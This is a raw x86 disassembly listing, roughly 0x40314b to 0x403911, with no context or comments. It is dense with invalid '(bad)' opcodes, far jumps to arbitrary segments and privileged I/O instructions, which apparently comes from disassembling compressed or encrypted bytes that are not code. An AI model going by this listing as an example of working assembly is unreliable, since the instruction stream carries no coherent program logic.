  40314b:	pop    esp
  40314c:	add    edi,DWORD PTR [ebp+0xb]
  40314f:	push   cs
  403150:	jmp    0x40313b
  403152:	pop    esi
  403153:	push   edx
  403154:	aas    
  403155:	maskmovq mm2,(bad)
  403156:	not    DWORD PTR [eax]
  403158:	pop    ebp
  403159:	xchg   BYTE PTR [ebx-0x59731ca8],al
  40315f:	rcl    ebx,cl
  403161:	repnz add eax,ebx
  403164:	pop    ecx
  403165:	sahf   
  403166:	cld    
  403167:	dec    esi
  403168:	xchg   ecx,eax
  403169:	xlat   BYTE PTR ds:[ebx]
  40316a:	add    esi,DWORD PTR [edx+0x75]
  40316d:	mov    ds:0x9d04796c,eax
  403172:	sub    eax,0x431982f7
  403177:	bound  ecx,QWORD PTR [esi+0x60]
  40317a:	mov    bl,0xa7
  40317c:	test   eax,0xf0f535ba
  403181:	call   0xd74776b8
  403186:	xor    BYTE PTR [edi],ch
  403188:	pop    esi
  403189:	inc    edx
  40318a:	cmp    DWORD PTR ds:0xe4658e6b,ebx
  403190:	push   0x3f
  403192:	fnsave [ecx+0x6dc9b9f8]
  403198:	fiadd  WORD PTR [ecx-0x44]
  40319b:	mov    bl,0xf5
  40319d:	push   ss
  40319e:	fld    QWORD PTR [edi-0x79054f99]
  4031a4:	fld    DWORD PTR [esi-0x3a56cf3e]
  4031aa:	jno    0x403132
  4031ac:	mov    edx,0xd8e5f6b1
  4031b1:	jl     0x40320c
  4031b3:	sar    esi,1
  4031b5:	pop    ds
  4031b6:	inc    edx
  4031b7:	push   0x3e
  4031b9:	adc    al,0xbb
  4031bb:	(bad)  [ebx]
  4031bd:	push   ebp
  4031be:	xor    al,0xb
  4031c0:	mov    cl,0x82
  4031c2:	or     bh,BYTE PTR [esi]
  4031c4:	or     BYTE PTR [ebx+0x16],0x84
  4031c8:	clc    
  4031c9:	pop    esi
  4031ca:	mov    dh,ch
  4031cc:	inc    ecx
  4031cd:	or     eax,0xaa317979
  4031d2:	sbb    DWORD PTR [edi+0x78eb892d],0x5e186fc6
  4031dc:	or     DWORD PTR [esp+ecx*1+0x31],0x548e8ee3
  4031e4:	jl     0x403183
  4031e6:	ins    DWORD PTR es:[edi],dx
  4031e7:	jno    0x403171
  4031e9:	test   al,0x73
  4031eb:	test   BYTE PTR [eax+0x39741372],cl
  4031f1:	iret   
  4031f2:	jnp    0x40324e
  4031f4:	jge    0x4031cf
  4031f6:	clc    
  4031f7:	mov    ebp,0xbdb7f2cf
  4031fc:	enter  0x16f4,0xb6
  403200:	test   al,0x13
  403202:	ins    DWORD PTR es:[edi],dx
  403203:	adc    al,0xe3
  403205:	nop
  403206:	mov    esi,0x18bfae61
  40320b:	test   eax,0x6e74034c
  403210:	mov    ecx,0x11a3fbf0
  403215:	stos   DWORD PTR es:[edi],eax
  403216:	pop    ebp
  403217:	imul   ecx,DWORD PTR [ebx+edx*4-0x65650554],0xffffff8f
  40321f:	xchg   ebx,eax
  403220:	js     0x403215
  403222:	mov    edi,0x315a2261
  403227:	fdivr  st,st(2)
  403229:	ret    
  40322a:	jmp    0x4bad:0x9a361f95
  403231:	mov    WORD PTR [edx],?
  403233:	les    eax,FWORD PTR [eax]
  403235:	mov    edi,0x33cd0333
  40323a:	mov    al,0x5f
  40323c:	dec    esi
  40323d:	retf   
  40323e:	mov    dh,0xa2
  403240:	push   ss
  403241:	or     cl,BYTE PTR [edx+0x1b23d9d3]
  403247:	pop    ecx
  403248:	inc    ecx
  403249:	add    cl,BYTE PTR [esi-0x14]
  40324c:	(bad)  
  40324d:	loop   0x4031d3
  40324f:	pop    ebp
  403250:	ret    
  403251:	pop    ebx
  403252:	mov    fs,WORD PTR [edi+0x48]
  403255:	inc    ebp
  403256:	fst    DWORD PTR [edi]
  403258:	mov    ds,WORD PTR [eax]
  40325a:	or     bh,BYTE PTR [edi-0x61]
  40325d:	pusha  
  40325e:	std    
  40325f:	fldenv [ebx+0x35]
  403262:	ins    BYTE PTR es:[edi],dx
  403263:	inc    esi
  403264:	push   ds
  403265:	cmp    BYTE PTR [edi+0x70efae02],bh
  40326b:	xchg   DWORD PTR [eax],esp
  40326d:	int    0x7a
  40326f:	mov    BYTE PTR [edi+0x5c],bl
  403272:	add    dl,BYTE PTR [ebp-0x3b]
  403275:	sub    esi,DWORD PTR [eax]
  403277:	adc    al,0x95
  403279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40327a:	iret   
  40327b:	adc    edi,ebp
  40327d:	pop    DWORD PTR [ebp+ebx*1-0x35]
  403281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403282:	mov    ch,0xdc
  403284:	mov    ecx,0x22c4424f
  403289:	pop    es
  40328a:	inc    ebx
  40328b:	or     al,0x30
  40328d:	imul   BYTE PTR [edi+0xa]
  403290:	out    0xc3,al
  403292:	jecxz  0x403257
  403294:	pop    edi
  403295:	aad    0xe9
  403297:	xor    DWORD PTR [edx+0x1c7b2dfe],ecx
  40329d:	leave  
  40329e:	cwde   
  40329f:	inc    esi
  4032a0:	jnp    0x4032bc
  4032a2:	outs   dx,DWORD PTR ds:[esi]
  4032a3:	jb     0x403275
  4032a5:	inc    ebx
  4032a6:	xchg   ebp,eax
  4032a7:	mov    esi,0x3df4f282
  4032ac:	mov    cl,0x74
  4032ae:	dec    esp
  4032af:	les    edx,FWORD PTR [eax-0x8ef5f86]
  4032b5:	adc    bh,BYTE PTR [eax-0x6d]
  4032b8:	shr    DWORD PTR [eax+0x68],1
  4032bb:	aaa    
  4032bc:	iret   
  4032bd:	inc    esi
  4032be:	(bad)  
  4032c0:	test   BYTE PTR [ecx-0x7f],al
  4032c3:	clc    
  4032c4:	xchg   BYTE PTR [edi+ecx*4],ch
  4032c7:	inc    edi
  4032c8:	cmp    DWORD PTR [ecx+0x45],eax
  4032cb:	daa    
  4032cc:	mov    ecx,0x897dc941
  4032d1:	pop    ebx
  4032d2:	cli    
  4032d3:	dec    edx
  4032d4:	call   0x3749:0xabc10e7e
  4032db:	aam    0xe3
  4032dd:	pop    esp
  4032de:	jl     0x403271
  4032e0:	cmp    ah,dl
  4032e2:	dec    edx
  4032e3:	repnz nop
  4032e5:	cmp    al,0x3c
  4032e7:	ret    
  4032e8:	mov    ebx,0x3aa198f7
  4032ed:	cmp    al,0x5e
  4032ef:	pop    edi
  4032f0:	push   0x59
  4032f2:	adc    BYTE PTR [edi+eax*8],0x27
  4032f6:	mov    ds:0x8dd8bb6e,al
  4032fb:	jb     0x4032ee
  4032fd:	mov    ds:0xecc94c31,eax
  403302:	cwde   
  403303:	adc    edx,ebp
  403305:	ror    BYTE PTR [esi+ebx*8-0x18dbc2a7],1
  40330c:	jae    0x40332b
  40330e:	fs mov ah,0xb
  403311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403312:	dec    eax
  403313:	lea    esp,[edi+0x5d99b508]
  403319:	dec    ebx
  40331a:	fs jl  0x4032c5
  40331d:	outs   dx,BYTE PTR ds:[esi]
  40331e:	pop    ds
  40331f:	cmc    
  403320:	add    eax,0x6ec4582c
  403325:	ror    DWORD PTR [esi],1
  403327:	popf   
  403328:	xchg   DWORD PTR [ebx-0x24],eax
  40332b:	retf   0x566e
  40332e:	aam    0x91
  403330:	les    edx,FWORD PTR [edi-0x6e]
  403333:	add    al,0x45
  403335:	or     DWORD PTR [ebx-0xb17aa94],0xffffffef
  40333c:	ficom  DWORD PTR [esi+0x3f5beb9c]
  403342:	push   ss
  403343:	pop    ebp
  403344:	push   ebx
  403345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403346:	loopne 0x403357
  403348:	stos   BYTE PTR es:[edi],al
  403349:	mov    bh,0xb8
  40334b:	fwait
  40334c:	jae    0x403389
  40334e:	(bad)  
  40334f:	loope  0x4032e3
  403351:	or     DWORD PTR ds:0x2913c565,edx
  403357:	xor    eax,0x6167c19a
  40335c:	push   0x27a7fc0b
  403361:	inc    esp
  403362:	sbb    bh,ah
  403364:	pop    es
  403365:	xlat   BYTE PTR ds:[ebx]
  403366:	xor    eax,DWORD PTR [ecx]
  403368:	mov    dl,0xc7
  40336a:	mov    ebp,0x5404c481
  40336f:	sub    dl,BYTE PTR [ebp+0x50a07377]
  403375:	mov    al,ds:0x554d4d90
  40337a:	ja     0x4033ad
  40337c:	jae    0x4033e0
  40337e:	int3   
  40337f:	mov    ds:0xe0a52f33,al
  403384:	or     ebp,DWORD PTR [esi]
  403386:	shr    dh,cl
  403388:	sbb    esi,DWORD PTR [esi]
  40338a:	mov    ecx,0xefeb1c2
  40338f:	pop    ebp
  403390:	out    0xee,al
  403392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403393:	or     eax,0x4c3e6aab
  403398:	sbb    DWORD PTR [eax-0x17d86ee6],0x45
  40339f:	mov    ch,0x9b
  4033a1:	inc    edi
  4033a2:	arpl   dx,ax
  4033a4:	or     edx,DWORD PTR [ebx+0x10]
  4033a7:	xchg   edx,eax
  4033a8:	pop    ds
  4033a9:	and    ch,BYTE PTR [eax-0x32922e24]
  4033af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b0:	mov    ah,0x1
  4033b2:	cmp    BYTE PTR [esp+edi*2],cl
  4033b5:	xchg   DWORD PTR [edi+0x197b6eeb],ecx
  4033bb:	jge    0x4033f6
  4033bd:	mov    cl,0xc0
  4033bf:	dec    ebx
  4033c0:	dec    esi
  4033c1:	inc    eax
  4033c2:	push   es
  4033c3:	cmp    al,0xcb
  4033c5:	mov    bh,0xae
  4033c7:	pop    ecx
  4033c8:	adc    ch,ah
  4033ca:	aaa    
  4033cb:	mov    bl,cl
  4033cd:	mov    edx,0xcd64075d
  4033d2:	(bad)  
  4033d3:	stos   BYTE PTR es:[edi],al
  4033d4:	jbe    0x4033f3
  4033d6:	js     0x40335c
  4033d8:	out    dx,al
  4033d9:	add    eax,0x52b34f46
  4033de:	aad    0x2b
  4033e0:	jno    0x4033a9
  4033e2:	out    dx,eax
  4033e3:	mov    esi,0xa1986604
  4033e8:	push   0x43
  4033ea:	ror    ch,cl
  4033ec:	test   ah,bl
  4033ee:	mov    ebp,0x8f66c8f6
  4033f3:	and    DWORD PTR [ecx-0x32],0xe468ce8d
  4033fa:	jo     0x4033a6
  4033fc:	loopne 0x4033bc
  4033fe:	jle    0x403381
  403400:	loope  0x40344e
  403402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403403:	jbe    0x403433
  403405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403406:	inc    ecx
  403407:	fistp  QWORD PTR [edx-0x3f]
  40340a:	cmp    ebx,DWORD PTR [edi+0x1eaaaf2]
  403410:	and    edx,DWORD PTR [eax-0x38]
  403413:	mov    ebp,0xbb09a502
  403418:	dec    eax
  403419:	push   eax
  40341a:	not    bl
  40341c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341d:	js     0x403498
  40341f:	enter  0xd71e,0xe0
  403423:	cmp    BYTE PTR [edx+0x78],ah
  403426:	sub    eax,0x4ba19d83
  40342b:	imul   DWORD PTR [edi+0x6b]
  40342e:	mov    bh,0x3b
  403430:	aad    0x87
  403432:	mov    ds:0xc2b81807,eax
  403437:	jnp    0x40345e
  403439:	aad    0xbd
  40343b:	sahf   
  40343c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40343e:	std    
  40343f:	cmp    esp,0x6e
  403442:	retf   0x3559
  403445:	out    dx,eax
  403446:	xchg   esi,eax
  403447:	jb     0x4034b1
  403449:	cdq    
  40344a:	mov    bh,0x4b
  40344c:	push   eax
  40344d:	std    
  40344e:	or     DWORD PTR [ecx+0xe],esp
  403451:	lahf   
  403452:	xchg   ebp,eax
  403453:	mov    ecx,0x9a5c54b7
  403458:	push   ebx
  403459:	jmp    0x1b7ff024
  40345e:	(bad)  
  40345f:	arpl   WORD PTR [edx],ax
  403461:	nop
  403462:	shr    BYTE PTR [ecx-0x5dd847a1],cl
  403468:	pop    eax
  403469:	test   DWORD PTR [edi],edx
  40346b:	pusha  
  40346c:	pop    esi
  40346d:	scas   eax,DWORD PTR es:[edi]
  40346e:	dec    esp
  40346f:	cmc    
  403470:	int    0xea
  403472:	scas   eax,DWORD PTR es:[edi]
  403473:	push   esi
  403474:	sub    ch,bl
  403476:	std    
  403477:	mov    ah,0xba
  403479:	push   edx
  40347a:	push   edi
  40347b:	adc    DWORD PTR [esp+edi*2-0x2a],ebx
  40347f:	(bad)  
  403480:	lock mov WORD PTR [eax-0x29],ss
  403484:	mov    ch,0x45
  403486:	lods   eax,DWORD PTR ds:[esi]
  403487:	pushf  
  403488:	fisub  WORD PTR [eax+esi*8+0x72]
  40348c:	mov    edx,0x85c8bdb1
  403491:	mov    dh,0x30
  403493:	jl     0x403478
  403495:	push   ecx
  403496:	mov    dh,0x95
  403498:	jg     0x4034ca
  40349a:	pusha  
  40349b:	out    dx,al
  40349c:	nop
  40349d:	mov    bl,0x58
  40349f:	push   ds
  4034a0:	xor    DWORD PTR [ecx],ebp
  4034a2:	cmp    dl,BYTE PTR ds:0xb59d22d4
  4034a8:	or     al,0x36
  4034aa:	and    al,0x8b
  4034ac:	mov    dh,0x87
  4034ae:	retf   
  4034af:	call   0xa494:0x55b2ee11
  4034b6:	cwde   
  4034b7:	cld    
  4034b8:	gs pop esp
  4034ba:	jnp    0x40344d
  4034bc:	cmp    eax,0xd214a859
  4034c1:	das    
  4034c2:	jmp    0x47f0:0x23cd9240
  4034c9:	fild   QWORD PTR [edi-0x7d5be3f2]
  4034cf:	or     BYTE PTR [ebp-0x3eaf9f6c],cl
  4034d5:	push   eax
  4034d6:	adc    al,ah
  4034d8:	mov    edx,0xcc77230c
  4034dd:	fcomp  DWORD PTR [ecx+0x78]
  4034e0:	jecxz  0x4034e6
  4034e2:	cmc    
  4034e3:	popf   
  4034e4:	xchg   edi,eax
  4034e5:	mov    es,WORD PTR [edi-0x63ce750e]
  4034eb:	dec    eax
  4034ec:	in     al,dx
  4034ed:	(bad)  
  4034ee:	xor    cl,BYTE PTR [edi+esi*8+0x1f894eec]
  4034f5:	das    
  4034f6:	scas   al,BYTE PTR es:[edi]
  4034f7:	addr16 iret 
  4034f9:	and    eax,0xa9028cec
  4034fe:	xchg   ebp,eax
  4034ff:	icebp  
  403500:	push   ecx
  403501:	fcom   st(3)
  403503:	cs push esi
  403505:	pop    ebx
  403506:	push   eax
  403507:	in     al,0x62
  403509:	sbb    ah,BYTE PTR [ebx]
  40350b:	lods   al,BYTE PTR ds:[si]
  40350d:	in     eax,0xee
  40350f:	dec    ecx
  403510:	pop    edi
  403511:	aad    0x2c
  403513:	aam    0x2d
  403515:	cmp    eax,0xeebd63f3
  40351a:	inc    esi
  40351b:	xchg   ecx,eax
  40351c:	lahf   
  40351d:	or     eax,0xdb21c5dd
  403522:	in     eax,0xb2
  403524:	aas    
  403525:	mov    ah,0xce
  403527:	dec    esp
  403528:	test   eax,0xa70654b5
  40352d:	and    eax,0x9e947f22
  403532:	push   esi
  403533:	ret    
  403534:	out    dx,eax
  403535:	or     al,0xf8
  403537:	sub    DWORD PTR [eax+0x5],edx
  40353a:	lods   al,BYTE PTR ds:[esi]
  40353b:	mov    bl,0xb4
  40353d:	xchg   ebx,eax
  40353e:	cld    
  40353f:	mov    edx,ebx
  403541:	in     eax,dx
  403542:	js     0x403567
  403544:	stos   DWORD PTR es:[edi],eax
  403545:	mov    BYTE PTR [eax+esi*2+0x58],bl
  403549:	inc    esp
  40354a:	ror    BYTE PTR [ebp-0x1],1
  40354d:	jno    0x403563
  40354f:	stos   DWORD PTR es:[edi],eax
  403550:	mov    ebx,gs
  403552:	push   ds
  403553:	xchg   esi,eax
  403554:	mov    ebp,0x18ea282d
  403559:	mov    al,ds:0x326e1de1
  40355e:	mov    ebp,ebp
  403560:	popf   
  403561:	popa   
  403562:	and    DWORD PTR [edi],0xa27fd1d1
  403568:	mov    ecx,0x9079d2ee
  40356d:	lods   al,BYTE PTR ds:[esi]
  40356e:	push   ecx
  40356f:	mov    eax,0xc73bf1fd
  403574:	xchg   ecx,eax
  403575:	dec    esp
  403576:	xchg   ebx,eax
  403577:	gs pop esp
  403579:	jmp    0x9314:0xa46de421
  403580:	push   ds
  403581:	or     al,0xe3
  403583:	inc    ecx
  403584:	xchg   ecx,eax
  403585:	push   ebp
  403586:	rcr    BYTE PTR [ebp+0x67038ef],0x38
  40358d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358e:	ins    BYTE PTR es:[edi],dx
  40358f:	ror    BYTE PTR [edi],1
  403591:	lods   al,BYTE PTR ds:[esi]
  403592:	or     BYTE PTR [edx+ebx*2-0x2e748e21],ch
  403599:	cmp    al,dh
  40359b:	sbb    ebx,DWORD PTR ds:0xf9a8ac34
  4035a1:	sbb    ah,cl
  4035a3:	(bad)
  4035a8:	daa    
  4035a9:	xchg   edx,esi
  4035ab:	lahf   
  4035ac:	pop    eax
  4035ad:	mov    ecx,0xafc73add
  4035b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b3:	out    0xe0,al
  4035b5:	pusha  
  4035b6:	jg     0x4035b3
  4035b8:	fcomp  QWORD PTR [esi]
  4035ba:	out    0x2e,al
  4035bc:	mov    esp,0x722b5a30
  4035c1:	scas   al,BYTE PTR es:[edi]
  4035c2:	jle    0x40363e
  4035c4:	inc    ecx
  4035c5:	push   edx
  4035c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035c7:	or     al,0x43
  4035c9:	(bad)  
  4035ca:	jmp    0x351c44ed
  4035cf:	pop    ds
  4035d0:	int3   
  4035d1:	mov    ecx,0xfcea549
  4035d6:	cmp    eax,edi
  4035d8:	dec    ebx
  4035d9:	xchg   edx,eax
  4035da:	lock cmp eax,0x856a5ba1
  4035e0:	add    eax,0xbfdd3b77
  4035e5:	jno    0x403649
  4035e7:	ficom  WORD PTR [eax-0x7641248f]
  4035ed:	lock out dx,al
  4035ef:	jae    0x40358f
  4035f1:	jg     0x403635
  4035f3:	loope  0x4035a3
  4035f5:	mov    edi,0xbf9d9617
  4035fa:	das    
  4035fb:	rcl    DWORD PTR ds:0xa2e00eed,cl
  403601:	sti    
  403602:	xlat   BYTE PTR ds:[ebx]
  403603:	sub    cl,BYTE PTR [esi+eiz*4-0x28]
  403607:	sbb    BYTE PTR [ecx+0x37],al
  40360a:	cmp    DWORD PTR [esi+0x3b8adbef],edx
  403610:	pop    ds
  403611:	icebp  
  403612:	std    
  403613:	int    0x35
  403615:	cmp    edx,DWORD PTR [ecx]
  403617:	cwde   
  403618:	or     bh,BYTE PTR [ebp+0x7c1ce39a]
  40361e:	stos   DWORD PTR es:[edi],eax
  40361f:	push   esp
  403620:	sbb    edx,ecx
  403622:	pop    edx
  403623:	fdivr  DWORD PTR [eax+0x7f]
  403626:	sub    ch,BYTE PTR [eax-0x38]
  403629:	cmp    ecx,DWORD PTR [ebx+0x11a63615]
  40362f:	jnp    0x403640
  403631:	retf   
  403632:	add    eax,0xfe1f1f8c
  403637:	jb     0x4036a1
  403639:	inc    ecx
  40363a:	xchg   esi,eax
  40363b:	xchg   esp,eax
  40363c:	dec    ebp
  40363d:	out    0x6a,eax
  40363f:	jmp    0x95bf63f5
  403644:	fdivr  QWORD PTR [esi-0x959a5a6]
  40364a:	aad    0x0
  40364c:	mov    eax,0x3d812dff
  403651:	popf   
  403652:	sbb    ch,ch
  403654:	adc    al,0x37
  403656:	arpl   WORD PTR [eax-0x798dc7c7],dx
  40365c:	fisubr DWORD PTR [esi]
  40365e:	mul    BYTE PTR [ebx-0x10ada1f5]
  403664:	mov    eax,ds:0x9c9342d2
  403669:	xor    BYTE PTR [edi+0x66b363a0],0xb6
  403670:	sbb    al,0x27
  403672:	inc    esp
  403673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403674:	lods   al,BYTE PTR ds:[esi]
  403675:	push   edx
  403676:	xchg   esp,eax
  403677:	sbb    eax,0x8b7bacd2
  40367c:	sbb    ecx,edi
  40367e:	(bad)  
  40367f:	mov    ds:0x29c5f0b8,al
  403684:	pop    edx
  403685:	mov    dh,ch
  403687:	shr    DWORD PTR [edi],1
  403689:	mov    ah,BYTE PTR [ecx+0x19]
  40368c:	adc    cl,BYTE PTR [edx]
  40368e:	cmp    dh,BYTE PTR [esi+eiz*1-0x29]
  403692:	jno    0x403699
  403694:	aaa    
  403695:	pop    ss
  403696:	mov    bl,0xd2
  403698:	or     edi,DWORD PTR [esi-0x41]
  40369b:	xor    BYTE PTR [esi+0x29],0xea
  40369f:	sub    al,0x7a
  4036a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036a2:	lds    eax,FWORD PTR [edi-0x47ef6041]
  4036a8:	xchg   ecx,eax
  4036a9:	xor    dl,BYTE PTR [edx+0x4440484]
  4036af:	xor    al,0x5c
  4036b1:	lock pop ss
  4036b3:	rcl    BYTE PTR [edx+0x77c6081e],0x69
  4036ba:	sar    dl,1
  4036bc:	mov    eax,0x28980060
  4036c1:	daa    
  4036c2:	push   0xffffffbe
  4036c4:	fld    TBYTE PTR [ecx+esi*1+0x37a5b5c7]
  4036cb:	mov    al,ds:0xd5c85dac
  4036d0:	in     al,dx
  4036d1:	imul   ebx,ecx,0x9bfd2ec8
  4036d7:	fdivp  st(5),st
  4036d9:	jle    0x403754
  4036db:	push   esi
  4036dc:	dec    edx
  4036dd:	cmp    ecx,edx
  4036df:	dec    esp
  4036e0:	(bad)  
  4036e1:	or     ebp,DWORD PTR [ecx]
  4036e3:	dec    edi
  4036e4:	test   al,0x93
  4036e6:	sub    BYTE PTR [ecx+0x4bc3f80c],0xa2
  4036ed:	sti    
  4036ee:	xchg   edi,eax
  4036ef:	xchg   esp,eax
  4036f0:	mov    ah,0xe1
  4036f2:	retf   
  4036f3:	mov    ds:0xce9fb6ee,al
  4036f8:	mov    ch,0x1e
  4036fa:	cmc    
  4036fb:	outs   dx,BYTE PTR ds:[esi]
  4036fc:	jb     0x403682
  4036fe:	call   0x3420591e
  403703:	mov    eax,0x5fc6419e
  403708:	inc    ebx
  403709:	fistp  DWORD PTR [ebx]
  40370b:	out    0xfc,al
  40370d:	add    bl,0xdc
  403710:	fimul  WORD PTR [esi+0x17]
  403713:	jmp    0x3acc:0xde0828ba
  40371a:	xor    al,0xa4
  40371c:	xor    ebp,DWORD PTR [eiz*8-0x4da71301]
  403723:	push   cs
  403724:	mov    eax,0x8cd74d14
  403729:	push   es
  40372a:	popf   
  40372b:	and    eax,0x9daf264e
  403730:	dec    edx
  403731:	js     0x403799
  403733:	mov    DWORD PTR [eax],edx
  403735:	lods   eax,DWORD PTR ds:[esi]
  403736:	sbb    al,0x2e
  403738:	lods   al,BYTE PTR ds:[esi]
  403739:	xor    edi,DWORD PTR [ecx-0xfcfe4ac]
  40373f:	lahf   
  403740:	loope  0x4037b1
  403742:	jmp    0x32296fc8
  403747:	std    
  403748:	mov    bl,0x87
  40374a:	aas    
  40374b:	lahf   
  40374c:	or     BYTE PTR ds:0x6c79fe81,0xb1
  403753:	and    BYTE PTR [ecx],0xf1
  403756:	out    dx,al
  403757:	jmp    0x4036e9
  403759:	js     0x4036dc
  40375b:	mov    al,ds:0xb0cafbbc
  403760:	pop    edx
  403761:	shl    BYTE PTR [edx-0x57],cl
  403764:	inc    ebx
  403765:	test   BYTE PTR [esi+eiz*4],0xdc
  403769:	mov    ch,0xe
  40376b:	dec    ecx
  40376c:	adc    al,BYTE PTR ds:0xba34aa22
  403772:	dec    esp
  403773:	mov    al,0x4d
  403775:	mov    ds:0xcc5edad5,al
  40377a:	jmp    0x4037a0
  40377c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40377e:	adc    ch,BYTE PTR [ecx+ebx*2-0x7822ce04]
  403785:	add    esi,eax
  403787:	mov    bl,BYTE PTR [edx+0x458f70d9]
  40378d:	add    DWORD PTR [esi+0x10],edi
  403790:	mov    ah,0x7f
  403792:	nop
  403793:	test   eax,0xbe52bc63
  403798:	jns    0x403769
  40379a:	jl     0x4037dc
  40379c:	sti    
  40379d:	dec    esi
  40379e:	mov    dh,0x5c
  4037a0:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4037a2:	mov    bl,0xa3
  4037a4:	mov    ebx,0x978078a7
  4037a9:	sbb    ah,BYTE PTR [edx]
  4037ab:	cmp    DWORD PTR [esi+0x9],ecx
  4037ae:	call   0xa0e9:0x73ae2f28
  4037b5:	dec    ebx
  4037b6:	mov    DWORD PTR [esi],ebp
  4037b8:	in     al,0x45
  4037ba:	jb     0x40377b
  4037bc:	jnp    0x4037c2
  4037be:	ja     0x4037ef
  4037c0:	scas   eax,DWORD PTR es:[edi]
  4037c1:	cmp    ch,BYTE PTR [ebp+0x4c]
  4037c4:	jecxz  0x4037c5
  4037c6:	sub    DWORD PTR [ebx-0x2d9ad86],ebx
  4037cc:	inc    eax
  4037cd:	iret   
  4037ce:	daa    
  4037cf:	xchg   ebx,eax
  4037d0:	mov    dl,0xa1
  4037d2:	cmp    bh,al
  4037d4:	mov    esi,0x42822eae
  4037d9:	sbb    dh,BYTE PTR [ebx-0x44]
  4037dc:	cmp    al,0x16
  4037de:	addr16 loopne 0x4037c4
  4037e1:	and    eax,0xb3c6409d
  4037e6:	mov    ds:0xb4c1770f,eax
  4037eb:	lds    ebx,FWORD PTR [ebx+0x6b8cbfe9]
  4037f1:	in     al,0x9
  4037f3:	pop    esi
  4037f4:	push   edx
  4037f5:	push   esp
  4037f6:	es (bad) 
  4037f8:	fcmovnb st,st(5)
  4037fa:	and    al,0xd5
  4037fc:	setae  BYTE PTR [edx+ebx*2]
  403800:	int3   
  403801:	push   esp
  403802:	scas   eax,DWORD PTR es:[edi]
  403803:	cmp    BYTE PTR [ecx-0x10e6d046],dl
  403809:	hlt    
  40380a:	les    edx,FWORD PTR [edx-0x4b]
  40380d:	or     al,0x72
  40380f:	pop    es
  403810:	pop    edi
  403811:	add    cl,BYTE PTR [edi]
  403813:	mov    ebp,0x6b266a83
  403818:	aaa    
  403819:	(bad)  
  40381a:	sbb    cl,BYTE PTR [edx-0x70fd7621]
  403820:	push   edi
  403821:	pushf  
  403822:	adc    bl,bl
  403824:	test   DWORD PTR [edi+0x2d32111f],esi
  40382a:	loop   0x40384a
  40382c:	sub    al,0xef
  40382e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40382f:	mov    ecx,0xad7fa3ca
  403834:	mov    ds:0xc102d224,al
  403839:	popa   
  40383a:	xor    al,0x4
  40383c:	dec    esi
  40383d:	test   BYTE PTR [ebp+0x14efc418],ah
  403843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403844:	mov    ah,0x23
  403846:	in     al,dx
  403847:	les    edi,FWORD PTR [edx+0x3d]
  40384a:	jae    0x40386a
  40384c:	fs wrmsr 
  40384f:	test   esi,edx
  403851:	mov    dl,0x6
  403853:	icebp  
  403854:	pusha  
  403855:	test   al,0x86
  403857:	(bad)  
  403858:	call   0x313bdfe8
  40385d:	sti    
  40385e:	push   ecx
  40385f:	and    BYTE PTR [esp-0x2c],bl
  403863:	arpl   WORD PTR [ecx],cx
  403865:	inc    ecx
  403866:	out    0x84,eax
  403868:	pop    ecx
  403869:	fistp  WORD PTR [ebx+0x5f]
  40386c:	mov    al,0x21
  40386e:	fisttp QWORD PTR [edx-0x30f27250]
  403874:	sub    ebx,ebx
  403876:	push   ebp
  403877:	fs cs adc al,0x43
  40387b:	or     al,0x43
  40387d:	push   es
  40387e:	xchg   esi,eax
  40387f:	pop    ds
  403880:	cmp    ebx,edx
  403882:	sahf   
  403883:	dec    edi
  403884:	xchg   esp,eax
  403885:	les    esi,FWORD PTR [ebp-0x13]
  403888:	cmp    eax,0x2e3fb1a5
  40388d:	xchg   DWORD PTR [edi],esp
  40388f:	pop    ds
  403890:	adc    ebp,DWORD PTR [edx+0x3e]
  403893:	xchg   DWORD PTR [ebx+ebp*2],ecx
  403896:	mov    ss,esp
  403898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403899:	mov    ecx,0xba95efed
  40389e:	mov    al,0x8f
  4038a0:	push   ds
  4038a1:	xchg   ebp,eax
  4038a2:	pop    esp
  4038a3:	mov    ah,0x40
  4038a5:	cs sti 
  4038a7:	sbb    BYTE PTR [ebp+0x5ab396af],ah
  4038ad:	add    DWORD PTR [ecx+0x8],0xffffffe9
  4038b1:	out    0x9a,eax
  4038b3:	push   esi
  4038b4:	pop    eax
  4038b5:	and    ebx,DWORD PTR [esi]
  4038b7:	test   esi,0xd2df2deb
  4038bd:	cmp    eax,0x18af067f
  4038c2:	jno    0x403935
  4038c4:	aad    0xfc
  4038c6:	jnp    0x403890
  4038c8:	es mov bh,0x3c
  4038cb:	call   0xc83a:0x577d9d99
  4038d2:	lahf   
  4038d3:	test   cl,0x3d
  4038d6:	dec    ebx
  4038d7:	fst    QWORD PTR [edx-0x3d]
  4038da:	jno    0x403950
  4038dc:	add    BYTE PTR [eax-0x11],dh
  4038df:	retf   
  4038e0:	fnstenv [edi]
  4038e2:	cld    
  4038e3:	(bad)  
  4038e5:	inc    ebx
  4038e6:	cs imul ebp,ebx,0x8e3b7b96
  4038ed:	sub    ecx,DWORD PTR [ebp+0x36]
  4038f0:	dec    edx
  4038f1:	push   DWORD PTR [ecx-0x3c2ad673]
  4038f7:	jns    0x403894
  4038f9:	mov    ecx,0x751f4825
  4038fe:	xor    eax,esi
  403900:	repz out 0x8b,eax
  403903:	and    eax,0x5fbb9373
  403908:	fisubr WORD PTR [ebp+0x33b47146]
  40390e:	repnz out dx,eax
  403910:	fwait
  403911:	mov    edi,0xe8412f8e
